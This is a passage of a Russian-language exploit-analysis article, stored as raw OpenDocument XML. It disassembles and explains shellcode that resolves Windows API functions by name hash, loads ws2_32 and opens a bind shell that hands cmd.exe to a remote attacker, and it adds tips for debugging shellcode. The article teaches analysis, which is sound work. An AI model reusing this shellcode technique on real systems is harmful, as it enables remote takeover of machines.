      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000040 </text:span><text:span text:style-name="T15">AC</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">lodsb</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; читаем очередной байт имени</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000041 84 </text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18">0<text:tab/><text:tab/></text:span><text:span text:style-name="T15">test</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">al</text:span><text:span text:style-name="T18">, </text:span><text:span text:style-name="T15">al</text:span><text:span text:style-name="T18"><text:tab/><text:tab/>; это конец имени?</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000043 74 07<text:tab/><text:tab/></text:span><text:span text:style-name="T15">jz</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">short</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">loc</text:span><text:span text:style-name="T18">_4</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"><text:tab/>; если конец, выходим из цикла</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000045 C1 CA 0D<text:tab/>ror<text:tab/>edx, 0Dh<text:tab/>; \_ </text:span><text:span text:style-name="T18">хэшируем</text:span><text:span text:style-name="T15"> </text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000048 01 C2<text:tab/><text:tab/>add<text:tab/>edx, eax<text:tab/>; / <text:s text:c="10"/></text:span><text:span text:style-name="T18">имя</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:0000004A EB F4<text:tab/><text:tab/>jmp<text:tab/>short loc_40<text:tab/>; </text:span><text:span text:style-name="T18">мотаем</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">цикл</text:span></text:p>
      <text:p text:style-name="P7">seg000:0000004C</text:p>
      <text:p text:style-name="P7">seg000:0000004C loc_4C:<text:tab/><text:tab/><text:tab/><text:tab/>; CODE XREF: seg000:00000043↑j</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:0000004C 3B 54 24 28<text:tab/>cmp<text:tab/>edx, [esp+28h]<text:tab/>; </text:span><text:span text:style-name="T18">это</text:span><text:span text:style-name="T15"> "</text:span><text:span text:style-name="T18">наш</text:span><text:span text:style-name="T15">" </text:span><text:span text:style-name="T18">хэш</text:span><text:span text:style-name="T15">?</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000050 75 </text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18">5<text:tab/><text:tab/></text:span><text:span text:style-name="T15">jnz</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">short</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">loc</text:span><text:span text:style-name="T18">_37<text:tab/>; продолжаем поиск если не наш</text:span></text:p>
      <text:p text:style-name="P7">seg000:00000052 8B 5F 24<text:tab/>mov<text:tab/>ebx, [edi+24h]<text:tab/>; ordinalTableRVA</text:p>
      <text:p text:style-name="P7">seg000:00000055 01 EB<text:tab/><text:tab/>add<text:tab/>ebx, ebp<text:tab/>; ordinalTable VA</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000057 66 8B 0C 4B<text:tab/>mov<text:tab/>cx, [ebx+ecx*2]; index</text:span></text:p>
      <text:p text:style-name="P7">seg000:0000005B 8B 5F 1C<text:tab/>mov<text:tab/>ebx, [edi+1Ch]<text:tab/>; exportAddressTableRVA</text:p>
      <text:p text:style-name="P7">seg000:0000005E 01 EB<text:tab/><text:tab/>add<text:tab/>ebx, ebp<text:tab/>; exportAddressTable VA</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000060 03 2</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"> 8</text:span><text:span text:style-name="T15">B</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">add</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18">,[</text:span><text:span text:style-name="T15">ebx</text:span><text:span text:style-name="T18">+</text:span><text:span text:style-name="T15">ecx</text:span><text:span text:style-name="T18">*4]; вот она наша функция!!!</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000063 89 6</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"> 24 1</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">mov</text:span><text:span text:style-name="T18"><text:tab/>[</text:span><text:span text:style-name="T15">esp</text:span><text:span text:style-name="T18">+1</text:span><text:span text:style-name="T15">Ch</text:span><text:span text:style-name="T18">], </text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"> ; сохраняем в </text:span><text:span text:style-name="T15">EAX</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000067 61<text:tab/><text:tab/></text:span><text:span text:style-name="T15">popa</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; восстанавливаем регистры</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000068 </text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18">3<text:tab/><text:tab/></text:span><text:span text:style-name="T15">retn</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; возвращаемся из функции</text:span></text:p>
      <text:p text:style-name="P33"><text:soft-page-break/>Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг17" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">18</text:sequence><text:span text:style-name="T1"> </text:span>процедура <text:span text:style-name="T1">MyGetProcAddress</text:span>, возвращающая адрес <text:span text:style-name="T1">API</text:span>-функции по хэш-сумме его имени</text:p>
      <text:p text:style-name="P26">Зная базовый адрес загрузки <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span> (он передается функции через стек и лежит по смещению 24<text:span text:style-name="T1">h</text:span> байта от вершины — остальное пространство занимают регистры, сохраненные командой <text:span text:style-name="T23">PUSHA</text:span>), программа получает указатель на <text:span text:style-name="T1">PE</text:span>-заголовок, откуда извлекает указатель на таблицу экспорта, считывая общее количество экспортируемых имен (numberOfNamePointers) и <text:span text:style-name="T1">RVA</text:span>-указатель на массив с именами, который тут же преобразуется в эффективный виртуальный адрес путем сложения с базовым адресом загрузки <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span>.</text:p>
      <text:p text:style-name="P26">А вот дальше… дальше начинается самое интересное! Для каждого из экспортируемых имен функция вычисляет хэш, сравнивая его с тем "загадочным" числом. Если они совпадают, искомая <text:span text:style-name="T1">API</text:span>-функция считается найденной и возвращается ее виртуальный адрес. Таким образом, данный код представляет собой аналог функции <text:span text:style-name="T23">GetProcAddress</text:span>, только с той разницей, что он принимает не <text:span text:style-name="T1">ASCII</text:span>-имя функции, а его 32-битный хэш. Условимся называть эту процедуру <text:span text:style-name="T23">MyGetProcAddress</text:span>.</text:p>
      <text:p text:style-name="P26">Можно ли восстановить имя функции по ее хэшу? С математической точки зрения — навряд ли, но что мешает нам запустить <text:span text:style-name="T1">shell</text:span>-код под отладчиком (<text:span text:style-name="T12">см. одноименную врезку</text:span>) и "подсмотреть" возвращенный виртуальный адрес, по которому имя определяется без проблем!</text:p>
      <text:p text:style-name="P26">Сказано сделано! Немного протрассировав программу до строки 82<text:span text:style-name="T1">h</text:span>, мы обнаруживаем в регистре <text:span text:style-name="T1">EAX</text:span> число 79450221<text:span text:style-name="T1">h</text:span> (зависит от версии системы на вашей машине наверняка будет иным). Нормальные отладчики (типа <text:span text:style-name="T1">OllyDbg</text:span>) тут же покажут имя функции <text:span text:style-name="T23">LoadLibraryA</text:span>. Как вариант, можно воспользоваться утилитой <text:span text:style-name="T1">DUMPBIN</text:span> из <text:span text:style-name="T1">Platform SDK</text:span>, запустив ее со следующими ключами: "<text:span text:style-name="T23">dumpbin KERNEL</text:span><text:span text:style-name="T20">32.</text:span><text:span text:style-name="T23">DLL</text:span><text:span text:style-name="T20"> /</text:span><text:span text:style-name="T23">EXPORTS</text:span><text:span text:style-name="T20"> &gt; </text:span><text:span text:style-name="T23">kernel</text:span><text:span text:style-name="T20">32</text:span>", только помните, что она показывает относительные <text:span text:style-name="T1">RVA</text:span>-адреса, поэтому необходимо либо добавить к ним базовый адрес загрузки <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span>, либо вычесть его из адреса искомой функции.</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P7">seg000:00000082 66 53<text:tab/><text:tab/><text:tab/>push<text:tab/>bx<text:tab/><text:tab/>; \</text:p>
      <text:p text:style-name="P7">seg000:00000084 66 68 33 32<text:tab/><text:tab/>push<text:tab/>small 3233h<text:tab/>; <text:s/>+ - "ws2_32"</text:p>
      <text:p text:style-name="P7">seg000:00000088 68 77 73 32 5F<text:tab/>push<text:tab/>5F327377h<text:tab/>; /</text:p>
      <text:p text:style-name="P7">seg000:0000008D 54<text:tab/><text:tab/><text:tab/>push<text:tab/>esp<text:tab/><text:tab/>; &amp;"ws2_32"</text:p>
      <text:p text:style-name="P7">seg000:0000008E FF D0<text:tab/><text:tab/><text:tab/>call<text:tab/>eax<text:tab/><text:tab/>; LoadLibraryA</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000090 68 CB ED FC 3B<text:tab/>push<text:tab/>3BFCEDCBh<text:tab/>; WSAStartup</text:span></text:p>
      <text:p text:style-name="P7">seg000:00000095 50<text:tab/><text:tab/><text:tab/>push<text:tab/>eax<text:tab/><text:tab/>; </text:p>
      <text:p text:style-name="P7">seg000:00000096 FF D6<text:tab/><text:tab/><text:tab/>call<text:tab/>esi<text:tab/><text:tab/>; MyGetProcAddress</text:p>
      <text:p text:style-name="P33">Листинг <text:sequence text:ref-name="refЛистинг18" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">19</text:sequence> загрузка библиотеки <text:span text:style-name="T1">ws</text:span>2_32 для работы с сокетами и ее инициализация</text:p>
      <text:p text:style-name="P26">Имя в своем распоряжении функцию <text:span text:style-name="T23">LoadLibraryA</text:span>, <text:span text:style-name="T1">shell</text:span>-код загружает библиотеку <text:span text:style-name="T1">ws</text:span>_2_32 для работы с сокетами, имя которой передается непосредственно через стек и завершается двумя нулевыми байтами (хотя было бы достаточно и одного), формируемого командой <text:span text:style-name="T23">PUSH BH</text:span><text:span text:style-name="T20"> </text:span>(как мы помним, несколькими строками выше, <text:span text:style-name="T1">EBX</text:span> был обращен в ноль — <text:span text:style-name="T12">см. листинг 9</text:span>). <text:span text:style-name="T23">PUSH BH</text:span> это двухбайтовая команда, в то время как <text:span text:style-name="T23">PUSH EBX</text:span><text:span text:style-name="T1"> </text:span>– однобайтовая. Но не будем придираться по мелочам.</text:p>
      <text:p text:style-name="P26">Процедура <text:span text:style-name="T20">MyGetProcAddress</text:span> снова принимает "магическое" число 3BFCEDCBh, которое после расшифровки под отладчиком оказывается <text:span text:style-name="T1">API</text:span>-функций <text:span text:style-name="T20">WSAStartup</text:span>, вызов которой совершенно неоправдан, поскольку для инициализации библиотеки сокетов ее достаточно вызвать один-единственный раз, что уже давно сделало уязвимое приложение, иначе как бы мы ухитрились его удаленно атаковать?</text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T34">Последовательность последующих вызовов вполне стандартна: </text:span><text:span text:style-name="T11">WSASocketA</text:span><text:span text:style-name="T34">(2, 1, 0,0,0,0) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T3">bind</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T7">s</text:span><text:span text:style-name="T35">, {sockaddr_in.2; sin_port.0</text:span><text:span text:style-name="T7">x</text:span><text:span text:style-name="T35">621</text:span><text:span text:style-name="T7">Eh</text:span><text:span text:style-name="T35">}, 0</text:span><text:span text:style-name="T7">x</text:span><text:span text:style-name="T35">10) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T7">listen</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T7">s</text:span><text:span text:style-name="T35">,2) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T3">accept</text:span><text:span text:style-name="T35"> (</text:span><text:span text:style-name="T7">s</text:span><text:span text:style-name="T35">, *</text:span><text:span text:style-name="T7">addr</text:span><text:span text:style-name="T35">, *</text:span><text:span text:style-name="T7">addrlen</text:span><text:span text:style-name="T35">) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T3">closesocket</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T7">s</text:span><text:span text:style-name="T35">).</text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T35">Дождавшись подключения на заданный порт, </text:span><text:span text:style-name="T7">shell</text:span><text:span text:style-name="T35">-код считывает </text:span><text:span text:style-name="T7">ASCII</text:span><text:span text:style-name="T35">-строку, передавая ее командному интерпретатору </text:span><text:span text:style-name="T7">cmd</text:span><text:span text:style-name="T35">.</text:span><text:span text:style-name="T7">exe</text:span><text:span text:style-name="T35"> по следующей схеме: </text:span><text:span text:style-name="T3">CreateProcessA</text:span><text:span text:style-name="T35">(0, "</text:span><text:span text:style-name="T7">cmd</text:span><text:span text:style-name="T35">...", 0,0, 1,0,0,0, </text:span><text:span text:style-name="T7">lpStartupInfo</text:span><text:span text:style-name="T35">, </text:span><text:span text:style-name="T7">lpProcessInformation</text:span><text:span text:style-name="T35">) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T3">WaitForSingleObject</text:span><text:span text:style-name="T35">(</text:span><text:span text:style-name="T7">hProc</text:span><text:span text:style-name="T35">, -1) </text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T35"> </text:span><text:span text:style-name="T3">ExitThread</text:span><text:span text:style-name="T35">(0).</text:span></text:p>
      <text:p text:style-name="P27">Злоумышленник может запускать любые программы и выполнять пакетные команды, что дает ему практически неограниченную власть над системой, разумеется, если брандмауэр будет не прочь, но про обход брандмауэров уже неоднократно писали.</text:p>
      <text:h text:style-name="P31" text:outline-level="2">заключение</text:h>
      <text:p text:style-name="P27">Вот мы и познакомились с основными приемами исследования <text:span text:style-name="T1">exploit</text:span>'ов. Остальные анализируются аналогично. Главное — это не теряться и всегда в любой ситуации помнить, что <text:soft-page-break/>Интернет рядом с тобой! Достаточно лишь правильно составить запрос и все недокументированные структуры будут видны как на ладони, ведь недра операционных систем уже изрыты вдоль и поперек, так что крайне маловероятно встретить в <text:span text:style-name="T1">shell</text:span>-коде нечто принципиально новое. То есть, встретить как раз таки очень даже вероятно, но "новым" оно пробудет от силы неделю. Ну, пускай, десять дней. А после начнет расползаться по форумам, электронным и бумажным журналам, будет обсуждаться в курилках и хакерских кулуарах наконец. А затем <text:span text:style-name="T1">Microsoft</text:span> выпустит очередное исправление к своей замечательной системе и таким трудом добытые трюки станут неактуальны.</text:p>
      <text:h text:style-name="P31" text:outline-level="2">&gt;&gt;&gt; врезка как запустить <text:span text:style-name="T1">shell</text:span>-код под отладчиком </text:h>
      <text:p text:style-name="P27">Статические методы исследования, к которым относятся дизассемблеры, не всегда удобны и во многих случаях отладка намного более предпочтительна. Однако, отладчиков, способных отлаживать <text:span text:style-name="T1">shell</text:span>-код не существует и приходится хитрить.</text:p>
      <text:p text:style-name="P27">Пишем простую программу наподобие "<text:span text:style-name="T1">hello</text:span>, <text:span text:style-name="T1">word</text:span>!", компилируем. Открываем полученный исполняемый файл в <text:span text:style-name="T1">hiew</text:span>'е, привычным нажатием <text:span text:style-name="T1">ENTER</text:span>'а переключаемся в <text:span text:style-name="T1">hex</text:span>-режим, давим &lt;<text:span text:style-name="T1">F</text:span>8&gt; (<text:span text:style-name="T1">header</text:span>) и переходим в точку входа по &lt;<text:span text:style-name="T1">F</text:span>5&gt;. Нажимам &lt;*&gt; и выделяем курсором некоторое количество байт, такое — чтобы было не меньше размера <text:span text:style-name="T1">shell</text:span>-кода. Нажимаем &lt;*&gt; еще раз для завершения выделения и перемещаем курсор в начало выделенного блока (по умолчанию он будет раскрашен бордовым). Давим &lt;<text:span text:style-name="T1">Ctrl</text:span>-<text:span text:style-name="T1">F</text:span>2&gt;, в появившимся диалоговом окне вводим имя файла (в данном случае <text:span text:style-name="T1">shellcode</text:span>) и после завершения процесса загрузки блока с диска выходим из <text:span text:style-name="T1">hiew</text:span>'а. &lt;<text:span text:style-name="T1">F</text:span>9&gt; можно не нажимать, т. к. изменения сохраняются автоматически. Ругательство "<text:span text:style-name="T1">End</text:span> <text:span text:style-name="T1">of</text:span> <text:span text:style-name="T1">input</text:span> <text:span text:style-name="T1">file</text:span>" означает, что размер выделения превышает размер файла. В данном случае — это нормальная ситуация. Хуже, когда наоборот (если часть файла окажется незагруженной <text:span text:style-name="T1">shell</text:span>-код, естественно, работать не будет).</text:p>
      <text:p text:style-name="P27">После этой несложной хирургической операции исполняемый файл можно отлаживать любым отладчиком, хоть <text:span text:style-name="T1">soft</text:span>-<text:span text:style-name="T1">ice</text:span>, хоть <text:span text:style-name="T1">OllyDbg</text:span>, но перед этим необходимо отредактировать атрибуты кодовой секции (обычно она называется .<text:span text:style-name="T1">text</text:span>), разрешив ее модификацию, иначе <text:span text:style-name="T1">shell</text:span>-код выбросит исключение при первой же попытки записи. Проще всего обработать файл с помощью утилиты <text:span text:style-name="T1">EDITBIN</text:span>, входящий в штатный комплект поставки компилятора <text:span text:style-name="T1">Microsoft</text:span> <text:span text:style-name="T1">Visual</text:span> <text:span text:style-name="T1">C</text:span>++, запустив ее следующим образом:</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P10">EDITBIN filename.exe /SECTION:.text,rwe</text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг19" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">20</text:sequence><text:span text:style-name="T1"> </text:span>снятие с кодовой секции запрета на запись</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P33">Рисунок <text:sequence text:ref-name="refDrawing3" text:name="Drawing" text:formula="ooow:Drawing+1" style:num-format="1">4</text:sequence> <text:span text:style-name="T1">shell</text:span>-код, отлаживаемый в отладчике <text:span text:style-name="T1">OllyDbg</text:span></text:p>
      <text:h text:style-name="P30" text:outline-level="2">&gt;&gt;&gt; врезка интересные ссылки</text:h>
      <text:list xml:id="list4054437545378665303" text:style-name="WW8Num11">
        <text:list-item>
          <text:p text:style-name="P20">системные вызовы <text:span text:style-name="T1">NT</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P19">наиболее полная коллекция системных вызовов всей линейки <text:span text:style-name="T1">NT</text:span>-подобных систем. крайне полезна для исследователей (на английском языке): <text:span text:style-name="T9">http</text:span><text:span text:style-name="T31">://</text:span><text:span text:style-name="T9">www</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">metasploit</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">com</text:span><text:span text:style-name="T31">/</text:span><text:span text:style-name="T9">users</text:span><text:span text:style-name="T31">/</text:span><text:span text:style-name="T9">opcode</text:span><text:span text:style-name="T31">/</text:span><text:span text:style-name="T9">syscalls</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">html</text:span>;</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P19">системные вызовы пот <text:span text:style-name="T1">LINUX</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P19">энциклопедия системных вызовов различных <text:span text:style-name="T1">LINUX</text:span>-подобных систем с прототипами, а кое-где и с комментариями (на английском языке): <text:span text:style-name="T9">http</text:span><text:span text:style-name="T31">://</text:span><text:span text:style-name="T9">www</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">lxhp</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">in</text:span><text:span text:style-name="T31">-</text:span><text:span text:style-name="T9">berlin</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">de</text:span><text:span text:style-name="T31">/</text:span><text:span text:style-name="T9">lhpsyscal</text:span><text:span text:style-name="T31">.</text:span><text:span text:style-name="T9">html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6-11T21:11:00</dc:date>
    <meta:editing-cycles>629</meta:editing-cycles>
    <meta:editing-duration>P1DT19H12M</meta:editing-duration>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="11" meta:paragraph-count="293" meta:word-count="5495" meta:character-count="41212" meta:non-whitespace-character-count="35656"/>
    <meta:generator>LibreOffice/5.1.4.2$Windows_x86 LibreOffice_project/f99d75f39f1c57ebdd7ffc5f42867c12031db97a</meta:generator>
  </office:meta>
</office:document-meta>
</file>